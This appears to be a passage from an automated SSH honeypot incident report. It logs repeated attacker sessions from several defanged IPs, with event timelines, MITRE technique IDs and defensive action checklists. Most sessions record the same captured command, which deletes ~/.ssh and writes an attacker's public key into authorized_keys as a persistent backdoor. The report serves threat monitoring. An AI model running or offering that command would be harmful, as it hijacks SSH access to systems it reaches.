| `2026-06-01 05:28:13` | `cowrie.command.input` |
| `2026-06-01 05:28:13` | `cowrie.log.closed` |
| `2026-06-01 05:28:13` | `cowrie.session.params` |
| `2026-06-01 05:28:13` | `cowrie.command.input` |
| `2026-06-01 05:28:14` | `cowrie.log.closed` |
| `2026-06-01 05:28:14` | `cowrie.session.params` |
| `2026-06-01 05:28:14` | `cowrie.command.input` |
| `2026-06-01 05:28:15` | `cowrie.log.closed` |
| `2026-06-01 05:28:15` | `cowrie.session.params` |
| `2026-06-01 05:28:15` | `cowrie.command.input` |
| `2026-06-01 05:28:16` | `cowrie.log.closed` |
| `2026-06-01 05:28:16` | `cowrie.session.params` |
| `2026-06-01 05:28:16` | `cowrie.command.input` |
| `2026-06-01 05:28:16` | `cowrie.log.closed` |
| `2026-06-01 05:28:17` | `cowrie.session.params` |
| `2026-06-01 05:28:17` | `cowrie.command.input` |
| `2026-06-01 05:28:17` | `cowrie.log.closed` |
| `2026-06-01 05:28:17` | `cowrie.session.params` |
| `2026-06-01 05:28:17` | `cowrie.command.input` |
| `2026-06-01 05:28:18` | `cowrie.log.closed` |
| `2026-06-01 05:28:18` | `cowrie.session.params` |
| `2026-06-01 05:28:18` | `cowrie.command.input` |
| `2026-06-01 05:28:19` | `cowrie.log.closed` |
| `2026-06-01 05:28:19` | `cowrie.session.params` |
| `2026-06-01 05:28:19` | `cowrie.command.input` |
| `2026-06-01 05:28:20` | `cowrie.log.closed` |
| `2026-06-01 05:28:20` | `cowrie.session.params` |
| `2026-06-01 05:28:20` | `cowrie.command.input` |
| `2026-06-01 05:28:20` | `cowrie.log.closed` |
| `2026-06-01 05:28:21` | `cowrie.session.params` |
| `2026-06-01 05:28:21` | `cowrie.command.input` |
| `2026-06-01 05:28:21` | `cowrie.log.closed` |
| `2026-06-01 05:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc64a67ad4cb

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:28 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:28:07` | `cowrie.session.connect` |
| `2026-06-01 05:28:07` | `cowrie.client.version` |
| `2026-06-01 05:28:07` | `cowrie.client.kex` |
| `2026-06-01 05:28:07` | `cowrie.login.success` |
| `2026-06-01 05:28:08` | `cowrie.session.params` |
| `2026-06-01 05:28:08` | `cowrie.command.input` |
| `2026-06-01 05:28:08` | `cowrie.command.failed` |
| `2026-06-01 05:28:08` | `cowrie.log.closed` |
| `2026-06-01 05:28:08` | `cowrie.session.params` |
| `2026-06-01 05:28:08` | `cowrie.command.input` |
| `2026-06-01 05:28:08` | `cowrie.session.file_download` |
| `2026-06-01 05:28:08` | `cowrie.log.closed` |
| `2026-06-01 05:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20eed9b784e0

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:28 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:28:10` | `cowrie.session.connect` |
| `2026-06-01 05:28:10` | `cowrie.client.version` |
| `2026-06-01 05:28:10` | `cowrie.client.kex` |
| `2026-06-01 05:28:11` | `cowrie.login.success` |
| `2026-06-01 05:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4575b2fb31

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:28 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:28:18` | `cowrie.session.connect` |
| `2026-06-01 05:28:18` | `cowrie.client.version` |
| `2026-06-01 05:28:18` | `cowrie.client.kex` |
| `2026-06-01 05:28:19` | `cowrie.login.success` |
| `2026-06-01 05:28:19` | `cowrie.session.params` |
| `2026-06-01 05:28:19` | `cowrie.command.input` |
| `2026-06-01 05:28:19` | `cowrie.command.failed` |
| `2026-06-01 05:28:19` | `cowrie.log.closed` |
| `2026-06-01 05:28:20` | `cowrie.session.params` |
| `2026-06-01 05:28:20` | `cowrie.command.input` |
| `2026-06-01 05:28:20` | `cowrie.session.file_download` |
| `2026-06-01 05:28:20` | `cowrie.log.closed` |
| `2026-06-01 05:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce0ad2ad404

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:28 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:28:22` | `cowrie.session.connect` |
| `2026-06-01 05:28:22` | `cowrie.client.version` |
| `2026-06-01 05:28:22` | `cowrie.client.kex` |
| `2026-06-01 05:28:23` | `cowrie.login.success` |
| `2026-06-01 05:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a475b08d8b

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:28 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:28:50` | `cowrie.session.connect` |
| `2026-06-01 05:28:50` | `cowrie.client.version` |
| `2026-06-01 05:28:50` | `cowrie.client.kex` |
| `2026-06-01 05:28:51` | `cowrie.login.success` |
| `2026-06-01 05:28:51` | `cowrie.session.params` |
| `2026-06-01 05:28:51` | `cowrie.command.input` |
| `2026-06-01 05:28:51` | `cowrie.command.failed` |
| `2026-06-01 05:28:52` | `cowrie.log.closed` |
| `2026-06-01 05:28:52` | `cowrie.session.params` |
| `2026-06-01 05:28:52` | `cowrie.command.input` |
| `2026-06-01 05:28:52` | `cowrie.session.file_download` |
| `2026-06-01 05:28:52` | `cowrie.log.closed` |
| `2026-06-01 05:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82ab267fd052

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:28 |
| **Last Seen** | 2026-06-01 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:28:55` | `cowrie.session.connect` |
| `2026-06-01 05:28:55` | `cowrie.client.version` |
| `2026-06-01 05:28:55` | `cowrie.client.kex` |
| `2026-06-01 05:28:56` | `cowrie.login.success` |
| `2026-06-01 05:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b163d86626

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:29 |
| **Last Seen** | 2026-06-01 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:29:27` | `cowrie.session.connect` |
| `2026-06-01 05:29:27` | `cowrie.client.version` |
| `2026-06-01 05:29:27` | `cowrie.client.kex` |
| `2026-06-01 05:29:28` | `cowrie.login.success` |
| `2026-06-01 05:29:28` | `cowrie.session.params` |
| `2026-06-01 05:29:28` | `cowrie.command.input` |
| `2026-06-01 05:29:28` | `cowrie.command.failed` |
| `2026-06-01 05:29:28` | `cowrie.log.closed` |
| `2026-06-01 05:29:29` | `cowrie.session.params` |
| `2026-06-01 05:29:29` | `cowrie.command.input` |
| `2026-06-01 05:29:29` | `cowrie.session.file_download` |
| `2026-06-01 05:29:29` | `cowrie.log.closed` |
| `2026-06-01 05:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f49d73bbd6

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:29 |
| **Last Seen** | 2026-06-01 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:29:31` | `cowrie.session.connect` |
| `2026-06-01 05:29:31` | `cowrie.client.version` |
| `2026-06-01 05:29:31` | `cowrie.client.kex` |
| `2026-06-01 05:29:32` | `cowrie.login.success` |
| `2026-06-01 05:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7642b0f6797f

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:29 |
| **Last Seen** | 2026-06-01 05:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:29:57` | `cowrie.session.connect` |
| `2026-06-01 05:29:57` | `cowrie.client.version` |
| `2026-06-01 05:29:57` | `cowrie.client.kex` |
| `2026-06-01 05:29:58` | `cowrie.login.success` |
| `2026-06-01 05:29:58` | `cowrie.session.params` |
| `2026-06-01 05:29:58` | `cowrie.command.input` |
| `2026-06-01 05:29:58` | `cowrie.command.failed` |
| `2026-06-01 05:29:58` | `cowrie.log.closed` |
| `2026-06-01 05:29:58` | `cowrie.session.params` |
| `2026-06-01 05:29:58` | `cowrie.command.input` |
| `2026-06-01 05:29:58` | `cowrie.session.file_download` |
| `2026-06-01 05:29:59` | `cowrie.log.closed` |
| `2026-06-01 05:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7058bdded3

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:30 |
| **Last Seen** | 2026-06-01 05:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:30:01` | `cowrie.session.connect` |
| `2026-06-01 05:30:01` | `cowrie.client.version` |
| `2026-06-01 05:30:01` | `cowrie.client.kex` |
| `2026-06-01 05:30:01` | `cowrie.login.success` |
| `2026-06-01 05:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5d1bf7b0f8

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:32 |
| **Last Seen** | 2026-06-01 05:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:32:17` | `cowrie.session.connect` |
| `2026-06-01 05:32:17` | `cowrie.client.version` |
| `2026-06-01 05:32:17` | `cowrie.client.kex` |
| `2026-06-01 05:32:18` | `cowrie.login.success` |
| `2026-06-01 05:32:18` | `cowrie.session.params` |
| `2026-06-01 05:32:18` | `cowrie.command.input` |
| `2026-06-01 05:32:18` | `cowrie.command.failed` |
| `2026-06-01 05:32:19` | `cowrie.log.closed` |
| `2026-06-01 05:32:19` | `cowrie.session.params` |
| `2026-06-01 05:32:19` | `cowrie.command.input` |
| `2026-06-01 05:32:19` | `cowrie.session.file_download` |
| `2026-06-01 05:32:19` | `cowrie.log.closed` |
| `2026-06-01 05:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6a7736d13c

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:32 |
| **Last Seen** | 2026-06-01 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:32:22` | `cowrie.session.connect` |
| `2026-06-01 05:32:22` | `cowrie.client.version` |
| `2026-06-01 05:32:22` | `cowrie.client.kex` |
| `2026-06-01 05:32:23` | `cowrie.login.success` |
| `2026-06-01 05:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66b231c96f4

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:33 |
| **Last Seen** | 2026-06-01 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:33:21` | `cowrie.session.connect` |
| `2026-06-01 05:33:21` | `cowrie.client.version` |
| `2026-06-01 05:33:21` | `cowrie.client.kex` |
| `2026-06-01 05:33:22` | `cowrie.login.success` |
| `2026-06-01 05:33:22` | `cowrie.session.params` |
| `2026-06-01 05:33:22` | `cowrie.command.input` |
| `2026-06-01 05:33:22` | `cowrie.command.failed` |
| `2026-06-01 05:33:22` | `cowrie.log.closed` |
| `2026-06-01 05:33:23` | `cowrie.session.params` |
| `2026-06-01 05:33:23` | `cowrie.command.input` |
| `2026-06-01 05:33:23` | `cowrie.session.file_download` |
| `2026-06-01 05:33:23` | `cowrie.log.closed` |
| `2026-06-01 05:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8403f244a256

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:33 |
| **Last Seen** | 2026-06-01 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:33:25` | `cowrie.session.connect` |
| `2026-06-01 05:33:25` | `cowrie.client.version` |
| `2026-06-01 05:33:25` | `cowrie.client.kex` |
| `2026-06-01 05:33:26` | `cowrie.login.success` |
| `2026-06-01 05:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fbd73f4286

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:33 |
| **Last Seen** | 2026-06-01 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:33:40` | `cowrie.session.connect` |
| `2026-06-01 05:33:40` | `cowrie.client.version` |
| `2026-06-01 05:33:40` | `cowrie.client.kex` |
| `2026-06-01 05:33:41` | `cowrie.login.success` |
| `2026-06-01 05:33:41` | `cowrie.session.params` |
| `2026-06-01 05:33:41` | `cowrie.command.input` |
| `2026-06-01 05:33:41` | `cowrie.command.failed` |
| `2026-06-01 05:33:41` | `cowrie.log.closed` |
| `2026-06-01 05:33:42` | `cowrie.session.params` |
| `2026-06-01 05:33:42` | `cowrie.command.input` |
| `2026-06-01 05:33:42` | `cowrie.session.file_download` |
| `2026-06-01 05:33:42` | `cowrie.log.closed` |
| `2026-06-01 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf7b6a58288

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:33 |
| **Last Seen** | 2026-06-01 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

